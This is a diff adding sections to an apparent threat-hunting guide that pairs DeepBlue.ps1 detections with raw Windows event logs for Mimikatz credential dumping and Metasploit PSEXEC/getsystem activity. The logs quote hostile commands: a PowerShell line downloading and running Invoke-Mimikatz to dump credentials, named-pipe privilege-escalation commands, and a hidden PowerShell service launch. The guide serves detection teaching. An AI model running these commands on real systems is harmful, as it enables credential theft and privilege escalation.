@@ -1683,3 +1683,273 @@ Process Information:
         Creator Process ID:     0xf14
         Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
 ```
+
+## Mimikatz `lsadump::sam`
+
+|Event|Command|
+|-----|-------|
+|Mimikatz `lsadump::sam`|`.\DeepBlue.ps1 .\evtx\mimikatz-privesc-hashdump.evtx`|
+
+```
+Date    : 4/30/2019 11:08:29 AM
+Log     : Security
+EventID : 4673
+Message : Sensititive Privilege Use Exceeds Threshold
+Results : Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.
+          Username: Sec504
+          Domain Name: SEC504STUDENT
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\mimikatz-privesc-hashdump.evtx"; id=4673} | fl
+
+TimeCreated  : 4/30/2019 11:08:29 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4673
+Message      : A privileged service was called.
+
+               Subject:
+                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1000
+                Account Name:           Sec504
+                Account Domain:         SEC504STUDENT
+                Logon ID:               0x1E3DD
+
+               Service:
+                Server: Security
+                Service Name:   -
+
+               Process:
+                Process ID:     0x15a8
+                Process Name:   C:\Tools\mimikatz\mimikatz.exe
+
+               Service Request Information:
+                Privileges:             SeTcbPrivilege
+```
+
+## Metasploit (PSEXEC) Native Target (Security)
+|Event|Command|
+|-----|-------|
+|Metasploit native target (security)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx`|
+
+With process monitoring, hunt for processes matching these criteria:
+
+- parent process is services.exe
+- process name is cmd.exe
+- command line includes echo AND \pipe\
+
+
+```
+Date    : 9/20/2016 8:41:13 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
+Decoded :
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-security.evtx"; id=4688} | fl
+
+
+TimeCreated  : 9/20/2016 8:41:13 PM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0x694
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1e8
+                Process Command Line:   cmd.exe /c echo hgabms > \\.\pipe\hgabms
+```
+## Metasploit (PSEXEC) Native Target (System)
+|Event|Command|
+|-----|-------|
+|Metasploit native target (system)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx`|
+
+Reference:
+- [Hunting for GetSystem in offensive security tools](https://redcanary.com/blog/getsystem-offsec/)
+
+With Windows Event Logs, search for events with the ID 7045 that match these criteria:
+
+- ServiceFileName contains cmd.exe OR %COMSPEC%
+- ServiceFileName contains echo AND \pipe\
+
+```
+Date    : 9/20/2016 8:41:13 PM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: hgabms
+          Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7036
+Message : Suspicious Service Name
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Command :
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : New Service Created
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : New Service Created
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Command : %SYSTEMROOT%\duKhLYUX.exe
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: KgXItsbKgTJzdzwl
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-system.evtx"; id=7045,7036} | fl
+
+
+TimeCreated  : 9/20/2016 8:41:13 PM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  hgabms
+               Service File Name:  cmd.exe /c echo hgabms > \\.\pipe\hgabms
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+
+TimeCreated  : 9/20/2016 8:41:03 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The Application Experience service entered the running state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The KgXItsbKgTJzdzwl service entered the stopped state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The KgXItsbKgTJzdzwl service entered the running state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  KgXItsbKgTJzdzwl
+               Service File Name:  %SYSTEMROOT%\duKhLYUX.exe
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+```
+
+## Metasploit PowerShell Target (Security/System)
+|Event|Command|
+|-----|-------|
+|Metasploit PowerShell target (security)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx`|
+|Metasploit PowerShell target (system)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-system.evtx`|
+
+```
+Date    : 9/20/2016 9:35:58 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo genusn > \\.\pipe\genusn
+Decoded :
+
+Date    : 9/20/2016 9:35:46 AM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: UWdKhYTIQWWJxHfx
+          Long Command Line: greater than 1000 bytes
+          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
+          500+ consecutive Base64 characters
+          Base64-encoded and compressed function
+
+Command : %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
+```
+
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-powershell-target-security.evtx",".\evtx\metasploit-psexec-powershell-target-system.evtx"; id=4688,7045} | Where-Object { $_.Message -ilike "*echo*" -or $_.Message -ilike "*cmd.exe*" -or $_.Message -ilike "*COMSPEC*" -or $_.Message -ilike "*\\pipe\\*" } | Format-List
+
+TimeCreated  : 9/20/2016 9:35:58 AM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  genusn
+               Service File Name:  cmd.exe /c echo genusn > \\.\pipe\genusn
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+
+TimeCreated  : 9/20/2016 9:35:46 AM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  UWdKhYTIQWWJxHfx
+               Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
+TimeCreated  : 9/20/2016 9:35:58 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0xe8c
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1cc
+                Process Command Line:   cmd.exe /c echo genusn > \
+TimeCreated  : 9/20/2016 9:35:46 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0xb2c
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1cc
+                Process Command Line:   C:\Windows\system32\cmd.exe
+```
